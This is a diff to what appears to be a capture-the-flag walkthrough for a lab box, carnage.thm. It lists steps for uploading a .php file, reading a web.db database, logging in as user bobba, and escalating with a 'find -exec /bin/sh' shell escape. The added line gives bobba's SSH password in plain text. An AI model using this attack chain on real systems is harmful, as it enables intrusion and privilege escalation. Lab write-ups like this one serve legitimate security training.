@@ -5,6 +5,7 @@
 4. Change extension to .php
 5. http://carnage.thm:82/images
 6. cd `/var/www/html/web1` and read web.db
-7. login as `bobba`
-8. `find . -exec /bin/sh \; -quit`
+    a. *You can pass these steps and ssh to bobba with ````bobba : -`G)8(t/NDkZ"u^{````
+8. login as `bobba`
+9. `find . -exec /bin/sh \; -quit`
 
